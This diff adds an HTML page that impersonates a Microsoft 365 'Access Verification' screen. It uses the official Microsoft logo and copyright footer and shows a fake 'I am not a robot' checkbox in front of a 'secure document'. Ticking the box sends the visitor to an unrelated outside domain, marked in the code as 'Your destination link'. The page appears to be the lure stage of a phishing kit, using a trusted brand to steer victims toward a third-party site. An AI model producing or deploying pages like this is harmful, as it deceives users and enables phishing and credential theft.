@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Microsoft 365 – Access Verification</title>
+  <style>
+    :root {
+      --ms-blue: #0078D4;
+      --ms-light: #f3f2f1;
+      --ms-font: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background-color: var(--ms-light);
+      font-family: var(--ms-font);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background: #fff;
+      padding: 40px 30px;
+      border-radius: 8px;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
+      width: 90%;
+      max-width: 440px;
+      text-align: center;
+    }
+
+    .logo img {
+      height: 36px;
+      margin-bottom: 25px;
+    }
+
+    h1 {
+      font-size: 22px;
+      margin-bottom: 12px;
+      color: #1a1a1a;
+    }
+
+    p {
+      font-size: 15px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .checkbox {
+      margin: 20px 0;
+      text-align: left;
+      font-size: 14px;
+    }
+
+    .checkbox input {
+      margin-right: 8px;
+      transform: scale(1.2);
+    }
+
+    .btn {
+      background-color: var(--ms-blue);
+      color: white;
+      font-size: 15px;
+      padding: 12px 28px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .error {
+      color: red;
+      font-size: 13px;
+      margin-top: 10px;
+    }
+
+    .footer {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #888;
+    }
+  </style>
+
+  <script>
+    function verifyAccess() {
+      const isChecked = document.getElementById('robotCheck').checked;
+      const error = document.getElementById('errorMessage');
+
+      if (isChecked) {
+        window.location.href = "https://espriteportal.com"; // ✅ Your destination link
+      } else {
+        error.textContent = "Please confirm you're not a robot to proceed.";
+      }
+    }
+  </script>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8be1df.svg" alt="Microsoft 365 Logo" />
+    </div>
+
+    <h1>Verify to Access</h1>
+    <p>To continue to the secure document, please confirm you're not a robot.</p>
+
+    <div class="checkbox">
+      <label><input type="checkbox" id="robotCheck" /> I am not a robot</label>
+    </div>
+
+    <button class="btn" onclick="verifyAccess()">Continue</button>
+
+    <div class="error" id="errorMessage"></div>
+
+    <div class="footer">
+      &copy; 2025 Microsoft Corporation. All rights reserved.
+    </div>
+  </div>
+</body>
+</html>
